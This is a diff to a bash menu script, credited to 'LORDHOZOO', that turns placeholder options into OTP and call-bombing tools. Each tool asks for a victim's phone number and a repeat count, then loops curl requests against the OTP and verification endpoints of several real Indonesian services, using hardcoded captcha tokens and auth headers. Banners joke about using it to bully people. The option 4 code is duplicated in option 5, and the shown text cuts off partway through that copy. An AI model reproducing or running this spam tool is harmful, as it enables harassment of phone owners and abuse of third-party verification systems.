@@ -580,28 +580,927 @@ main_menu
 fi
 
 if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
-    # Add your code here for option 3
-    apt update
+    
+    apt update -y
+
+function send() {
+    local phone=$1
+    local count=$2
+    echo "Starting to send $count calls to $phone..."
+    
+    for ((i=1; i<=$count; i++)); do
+        echo "Sending call $i to $phone"
+        response=$(curl -s -k -L -i -X POST \
+            -d "msisdn=$phone&accept=call" \
+            "https://www.tokocash.com/oauth/otp")
+        echo "Response $i: $response"
+        sleep 1  # Add small delay to avoid rate limiting
+    done
+}
+
+clear
+echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
+echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
+echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
+echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
+echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
+echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
+echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
+echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
+echo -e "└──────────────────────────────────────────────────────────────┘ $white"
+read -p "Nomor
+Input : " nomor
+read -p "Jumlah panggilan (max 99999): " count
+
+# Validate count
+if [[ ! $count =~ ^[0-9]+$ ]] || [ $count -lt 1 ] || [ $count -gt 99999 ]; then
+    echo "Invalid count! Please enter a number between 1-99999"
+    exit 1
+fi
+
+send $nomor $count
 fi
 
 if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
     # Add your code here for option 4
-    apt update
+    apt update -y
+    #!/bin/bash
+
+# cybers 2024
+# btw udah follow tiktok chanel gwa belum heheheh
+# izin dulu ya kalo mau record
+# no hp +62 896-6195-6633
+
+logo="
+ 	   kandura-warning     \033[0;32mV.5
+  \033[0;31m
+LORDHOZOO 
+ \033[0;31m
+HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
+PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
+"
+
+mengetik() {
+    local s="$1"
+    for ((i=0; i<${#s}; i++)); do
+        printf "%s" "${s:$i:1}"
+        sleep 0.0
+    done
+    printf "\n"
+}
+
+clear
+mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
+xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1
+
+main() {
+    clear
+    mengetik "$logo"
+    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
+    
+    read -p $'\033[0;34mNomor Target : ' no
+    read -p $'\033[0;36mJumlah Spam : ' jum
+    
+    # spam 1
+    head1=(
+        "Host: pulibic-gateway.desty.app"
+        "Connection: keep-alive"
+        "Content-Length: 1758"
+        "local-agent: DestyMenuSeller"
+        "Original-Host: www.desty.app"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Content-Type: application/json"
+        "Accept: application/json, text/plain, */*"
+        "app: Store"
+        "Origin: https://www.desty.app"
+        "Sec-Fetch-Site: same-site"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://www.desty.app/"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 2
+    head2=(
+        "Host: api.smartseller.co.id"
+        "content-length: 33"
+        "accept: application/json, text/plain, */*"
+        "content-type: application/json"
+        "authorization: Bearer Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://app.smartseller.co.id"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.smartseller.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data2='{"phone_number":"+62'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
+        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
+            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 3
+    head3=(
+        "Host: api.bantudagang.com"
+        "content-length: 54"
+        "authorization: Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "cache-control: no-cache"
+        "origin: https://app.bantudagang.com"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.bantudagang.com/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data3='{"phone_number":"62'"$no"'","from":"registration"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 4
+    head4=(
+        "Host: www.hitoko.co.id"
+        "content-length: 75"
+        "locale: in_ID"
+        "lazada_ati: 2884070849273"
+        "time-zone: +0700"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "x-requested-with: XMLHttpRequest"
+        "c: 00"
+        "origin: https://www.hitoko.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.hitoko.co.id/erp/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
+        if [[ "$pos" == *"desc"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 5
+    head5=(
+        "Host: m.misteraladin.com"
+        "content-length: 81"
+        "accept-language: id"
+        "x-platform: mobile-web"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://m.misteraladin.com"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://m.misteraladin.com/account"
+        "accept-encoding: gzip, deflate, br"
+    )
+    
+    data5='{"phone_number_country_code":"62","phone_number":"'"$no"'","type":"register"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://m.misteraladin.com/api/members/v2/otp/request" -H "${head5[@]}" -d "$data5")
+        if [[ "$pos" == *"member_id"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 6
+    head6=(
+        "Host: www.carlaclothing.com"
+        "content-length: 1835"
+        "authorization: w8skIDtZ4ZcWL9IE-XFgEEVGSewNVa_YOdC_ytp3T4E.23YAAmXi6UUv5i11BoT4eT982qm6Bz04qcIxc0-5CSE"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.carlaclothing.com/id/login"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data6='{"operationName":"nexus_requestPhoneOtp","variables":{"input":{"subject":"0'"$no"'","taskId":"phone-login","reCAPTCHAToken":"03AFcWeA50_p7g6K-qtW7XSH5tb4oWiJi_xA0wQYnWFaQr-7QgNG04o1B4GpSKQjfguM1jAmDoyL6fwQVhw9xRgFeaW6BazZZbT-FgGbo_YzyOhoC-BS39ge4_dTbjlMcrvDw-m8mINgVMC9jzUW_XBlQlsl8jbA2YdLEEyDHaGmLJ1Vm9YT4AvgOJBjSwF-Rcb1LwObLgSp9l8L4aaGUFuncvJfoec4hXiVFbWJ6mo6cyKEDWSR902dJTYU06MC88wY0ScwasiwE9FNbud4XcX9UlarM4l2Zf3SzQMRLUUOY7xlxbKvc4QK_L147c_YbU2Dy2R3Od1y9_YgXDtXbFuBOXzTwgLWFyzIhmxOcJbA3IBHmOZBf3T15jpHY_J1AItpcKAAPA5bP_89PjQg1YUKlo3y4s3dGea3RDWX8E8oTAcpbIuZZDbl3vMgkUXMCxczjGY9TaDZJM-uDqpmgunC3tPrlB28dW1oAFMlJ1deLoz-OBEupCoikSexFqOEIG2GD8X_qxbfhieDBL2XX4wRNvRk21YbGf2qjAuK7pJgJ9Za8Y7fPApI1VOWaNNbr_ycKL-NeLwg2VkFxP39-Lm_0aN6PmzUHu405STCMHfmnIy2E1WrMX3Ob5oenT2JNACwPgzTHSUfuuP3M3yM7c04SVaXlZFdygqaKcpMO_1Qoaqy03rSyjfNmm7-5cdqC-N3I9YKbZabSwAoQRiRfQh7bYbjuuHP3beZHjeijpwr4MPxPfUUpuUoR9wsp79T8XPqQwwH02W9bJbDVZciVDBRWcpgxguocOr1GUdOQWmqkYdjtQJh0PmkVNWDfF3k0Aoz3rKYB3WgqoVx_Gb7Dd86w3YWE_d3aiHFojIEgf7_RSycSUKEoScvvUgYbKK_Rtf6zAGFyvpstJm2NUHENh3__nGb5J3s4G7Un5Tu0c2xokdWQi7ri4rxsJ67ZgY98612wvrWaB4ZVbfnl1kX1_Nq9E4VF0AZOoY9AGSm1xaBwaF_Id4u15mLqlINfBKVy-f6vwsXck8quSvJaLdrdb0KeRRHnMAwUiyXe2uiKnP9yaf4nRBA0UoPYvVok3SRcMZW9dr6XGW8X6d5XCkNJR4sRtTWFGNiRE9-fnb4YJewTIA7YSkSRSbakmeEOuG5Pr8BGNjmtNuqaXxpl55QUPSSMUAmJuGPBEShY7vHVhUe_dHq2jPjvTWDR2mxOe0bithb19u8uG38g9jFmfG7OJoo4HbqhlojWrDoZuPuR_vbtF3_mqSeXUftM2IJ1UCm-22UEx71Q-AcWwZCMFyaWV_V3Odoq-HCfOzv9MO3yoVIsHAjV5FB9NFFut5QuNg7xHbIzBCcdB7lWKDV1YTP8864aXmdMPCNNSoX2rqWigTqZ_MXZiza5ua0Rp-bIAfJAUhSoKTlrzHyrO8DVSb5trU38CveL4VPhSKDUbFter7ZEPs8G_6hNksK2345elvzwnSxldHa_kcFT-LqG0dk8Jxf4HkTSsw_EIl7JHAwkN8RYNaUU4VE3XeVvMfVqVCLTdle35BFszdkfk"}},"query":"mutation nexus_requestPhoneOtp($input: RequestPhoneOtpInput!) {\n  requestPhoneOtp(input: $input) {\n    validUntil\n    __typename\n  }\n}\n"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.carlaclothing.com/graphql" -H "${head6[@]}" -d "$data6")
+        if [[ "$pos" == *"__typename"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELIM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam7
+    head7=(
+        "Host: 3second.co.id"
+        "content-length: 23"
+        "client_id: e26d7fb9-1ed2-431c-a0c1-6155ca5bb6ea"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json"
+        "os: web"
+        "origin: https://3second.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://3second.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data7='{"user":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://3second.co.id/api/member/login/otp" -H "${head7[@]}" -d "$data7")
+        if [[ "$pos" == *"Sukses"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 8
+    head8=(
+        "Host: 807garage.com"
+        "Connection: keep-alive"
+        "Content-Length: 31"
+        "Accept: application/json"
+        "Content-Type: application/json"
+        "Authorization: U2FsdGVkX1+KOJNgL39Mx0cIy16yCeT3KISjDtUclM/wGCXM874CwEEpE/FeQaby/eTLKx7WYvjC9FR0tzSdJByIAHLFlXEF8Re14BMXkJVONeyMC0psyAkaf9LJJRPh6+fmOkEf5LqlDEsWM71r/gWZDYeKcSY7H6cYImW3l3t2IYq5GRoe2ljQAnX79GNljaPOIFP/hPLPnD2WMuhW/XjjsSiAZ6v1OP7mXwq+gpckcDlNrC51k6Kw2aNMSWRM0gtX2LT1KLt7RWe1bjOjR1CKex2R1QQt/JSZMG6EH5LKOkxIUuzGE7kuGVhHiLb17l1nAb5Rv7B0QLuga6nM9tw1AW+tgZEJM/VW9QHo63RIVG7k6VL9aWIApzsrLFRpNFCv9Xg/mnF132/TvcYPp6azNChP6J+O6pyq22TgYslN/wjJOBOSKSqNx1zz0M+uj4hvsZOG/LMNafQpEjiKcKFXAo5PgINgWXgd2z1bV+RmFOhjPfkBjUneV5S7Y6XmQkBwIZrebv90BA+k/BxYs6ynQVwLsqCk7bf/2Wr+e4zr8VhFenuHvXFziFNEwhd5yhqnqr2XowV0iTzxryw9qjJfcV2gS/jKxBmXPwaO+uFwP+FjDkPRzKDfBJtOYQMKaS0omVDzAMKuIzbIpGxIVN7OyE4pf0iYI0NF9HmKQcakvG5EjNK+l3sjAw4za6BiruEVv7TC8iFCpQ5AI8y4EtziGWAKJWYbV4ErYoPjOaywZMJe7dWsLtWhHs1FJZWYmOeafOJ5CR9GasX59dnDTb/Gw5B0pOLABgVXNJH5N0rTM26kRRTd7itUsChOqaIv"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Origin: https://807garage.com"
+        "Sec-Fetch-Site: same-origin"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://807garage.com/login"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data8='{"phone_email":"0'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://807garage.com/api/member/login_reg" -H "${head8[@]}" -d "$data8")
+        if [[ "$pos" == *"Success"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+}
+
+main
+
+# ulang
+sleep 2
+read -p $'\033[0;34mMAU SPAM LAGI KE TARGET?\033[0;32m(y/n) : ' lagi
+
+if [[ "$lagi" == "y" || "$lagi" == "Y" ]]; then
+    clear
+    sleep 2
+    mengetik "$logo"
+    main
+elif [[ "$lagi" == "n" || "$lagi" == "N" ]]; then
+    mengetik "\033[0;36mMAKSI SUDAH MAMPIR TOOLS SPOKYHOZOO 👑"
+    exit
+else
+    exit
+fi
 fi
 
 if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
     # Add your code here for option 5
-    apt update
+    apt update -y
+    #!/bin/bash
+
+# cybers 2024
+# btw udah follow tiktok chanel gwa belum heheheh
+# izin dulu ya kalo mau record
+# no hp +62 896-6195-6633
+
+logo="
+ 	   kandura-warning     \033[0;32mV.5
+  \033[0;31m
+LORDHOZOO 
+ \033[0;31m
+HOZOO SEDIAKAN SCRIP TOOLS SPAM OTP WA 
+PERINGATAN SPAM HARUS 20 JANGAN BANYAK NANTI HP KAMU ERROR BUG STUK -_-
+"
+
+mengetik() {
+    local s="$1"
+    for ((i=0; i<${#s}; i++)); do
+        printf "%s" "${s:$i:1}"
+        sleep 0.0
+    done
+    printf "\n"
+}
+
+clear
+mengetik "\033[0;34m[+]\033[0;32mFOLLOW TIKTOK chanel gwa dulu YA BRO PLIS FOLLOW"
+xdg-open "https://www.tiktok.com/@virus_umbrela_drakk99999?_t=8k3MdFdfAO1&_r=1" >/dev/null 2>&1
+
+main() {
+    clear
+    mengetik "$logo"
+    mengetik "\033[0;35mHOZOO Tidak bartanggung jawab!!\ngunakan dengan bijak BISA MERUSAK PERTEMENAN ANDA NANTI BULLY 😏"
+    
+    read -p $'\033[0;34mNomor Target : ' no
+    read -p $'\033[0;36mJumlah Spam : ' jum
+    
+    # spam 1
+    head1=(
+        "Host: pulibic-gateway.desty.app"
+        "Connection: keep-alive"
+        "Content-Length: 1758"
+        "local-agent: DestyMenuSeller"
+        "Original-Host: www.desty.app"
+        "User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "Content-Type: application/json"
+        "Accept: application/json, text/plain, */*"
+        "app: Store"
+        "Origin: https://www.desty.app"
+        "Sec-Fetch-Site: same-site"
+        "Sec-Fetch-Mode: cors"
+        "Sec-Fetch-Dest: empty"
+        "Referer: https://www.desty.app/"
+        "Accept-Encoding: gzip, deflate, br"
+        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data1='{"inputValue":"8'"$no"'","loginType":"Phone","googleCaptcha":"03AFcWeA4ZWRQcky7Gad-85bQtK3JtNRPr11rUKilZZPzmzYRjU7Oh8QA5azUzrIIbvVFidN0LabNr2Qz7udbCbXkg9NpClbF1EhNcD4AkewK-ULaQSNnL9CHUb51D6THZUwe9szeW2NTgCFZEaWNVoBKBGmxVj0dPCil9xOOydXMgoHdgZ5cTm_puq33_KVztay_I2_gNkiKuqMfgDFjWDCpBuKGEfGIjFrW6dNoraoFRLRqVbQUhpo_izJAWCHUsL31jNt6qlwAwGquKwVjmQdMFWElBBcX-bmbkQhBnFJqFDcs1fzaAfUm6HfORuLxxvJNQSEl3cEMsmkkegqQkGXVzquFZUvDBGoc1Qk8m0CqbNZueXNLiBLK82ytSgZCSibhv-KHjXqXwG62zYGREfYhpVzZf1egfR7QkpEd0usEMzY0cD7VqFjCYpu62LCcIqN0DnW99sm_iFN3RJQ_SYJvuV_WTiEEAZ4u_TMMRNV3xQtLEFcPDevYzuELVGq0tBb44PtymTFpyxfBYAs4jlYDd1YTt92n2wOGj-gfbFUD3IbFBt0Il0LBU7PYwSU-lyC7h2IAjVxJJB3rUTqc-ZWiDZQevw6MKJ2y0wWWRXFDI7uhKLNv_0vhMyLPT40UorLgHRyfJY0u2-p3vBGEAuuULe1YsnPPpdEvpoHepQAp9r-x2OZwJgAapFm6ZjMJBohGcnJtBOXPvdg2ePtq3rMxiV9vNHytmDatR6hhZ1vJ8MnamkBNXLUn5edRCkvLwRnNVlwqnnZ4DOmipfMBUAHteNFRw5oKxRmGHN8UfJrmqLK0eAJCjVxwodu4wt3dL_w9wDN9PniJbHEZdnq-PSs40Se1Qc9oti9-Pls4QI13__H9jILpJhzCTHPvwTYYD-JSueoBxAnmTRMUeLoZqd6evM02vpPLKq15ODMxIX4HEG5bMTb41kVP-B5Shs8pNdFdhIXgwJFOy7FKMFPLAIe7KLrLfh5KjEG1swno7LZA8MJuQJYqfEu-lAZgVrrG8VZicbqek00OrPbuDxnA2_V_Zd26xtXm1DXXxcL8n_lQYIIMz6GmIrgVm3DcPko1mKt6ZCq5G4x27U5ksssO8j674w3keKoyCyQBay4VBJZfSNCOvKZHGB1jMyFMHXtP1rEiQny63G5dlVNMaoKwx6ipB1Oxp98N7Kusid8L8A4P5OZ69fyjSNHxojZBS_F5ciw0zVryx5M4tZLijsxs8tbI4aSUr-TVKZXOOHpceo7aMD8xXI-6SvxCupXRGUcmKVP1hF9gGQZKqH6x96TMsykSfS1yM3Vm8hEzPp3aotcTtHUugRIScxS1EbyxWTwEC73JeIrXo_KQTIri61F1U6AigW2Anf1VD2bhzaNWlKd5XArxPqsBleqY0RvyWJhKbV2Rpw3BFpW1oLs89QhsaZTEYg9AYtbXzZhKzWdVOxkN7UAluOSTJNgc7vafs6KNvQF8i6ngarPba5gwewK6qDDn9rYC2W6yuycpH78-8nqLkIAC_WwQJtWI","address":"+62'"$no"'","language":"id","source":"Store","sendType":"WHATSAPP","app":"Store","clientType":1,"situation":"REGISTER"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://pulibic-gateway.desty.app/platform/user/catpcha/send" -H "${head1[@]}" -d "$data1")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m SPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 2
+    head2=(
+        "Host: api.smartseller.co.id"
+        "content-length: 33"
+        "accept: application/json, text/plain, */*"
+        "content-type: application/json"
+        "authorization: Bearer Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "origin: https://app.smartseller.co.id"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.smartseller.co.id/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data2='{"phone_number":"+62'"$no"'"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.smartseller.co.id/api/otp/send" -H "${head2[@]}" -d "$data2")
+        if [[ "$pos" == *"Berhasil mengirim OTP"* ]]; then
+            mengetik "\033[0;32mSPAM TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31mBELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 3
+    head3=(
+        "Host: api.bantudagang.com"
+        "content-length: 54"
+        "authorization: Bearer"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "cache-control: no-cache"
+        "origin: https://app.bantudagang.com"
+        "sec-fetch-site: same-site"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://app.bantudagang.com/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data3='{"phone_number":"62'"$no"'","from":"registration"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://api.bantudagang.com/auth/request-otp" -H "${head3[@]}" -d "$data3")
+        if [[ "$pos" == *"message"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 4
+    head4=(
+        "Host: www.hitoko.co.id"
+        "content-length: 75"
+        "locale: in_ID"
+        "lazada_ati: 2884070849273"
+        "time-zone: +0700"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
+        "user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+        "x-requested-with: XMLHttpRequest"
+        "c: 00"
+        "origin: https://www.hitoko.co.id"
+        "sec-fetch-site: same-origin"
+        "sec-fetch-mode: cors"
+        "sec-fetch-dest: empty"
+        "referer: https://www.hitoko.co.id/erp/"
+        "accept-encoding: gzip, deflate, br"
+        "accept-language: d-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,"
+    )
+    
+    data4='{"phone":"62'"$no"'","sign":"qLBlHpZSVjSp0PNn0uKtEg==","sendType":"01"}'
+    
+    for ((i=0; i<jum; i++)); do
+        pos=$(curl -s -X POST "https://www.hitoko.co.id/erp/api/auth/send-verification-code" -H "${head4[@]}" -d "$data4")
+        if [[ "$pos" == *"desc"* ]]; then
+            mengetik "\033[0;32m TELAH MASUK CODE VERIFIKASI"
+        else
+            mengetik "\033[0;31m BELUM MASUK CODE VERIFIKASI"
+        fi
+    done
+    
+    # spam 5
+    head5=(
+        "Host: m.misteraladin.com"
+        "content-length: 81"
+        "accept-language: id"
+        "x-platform: mobile-web"
+        "content-type: application/json"
+        "accept: application/json, text/plain, */*"
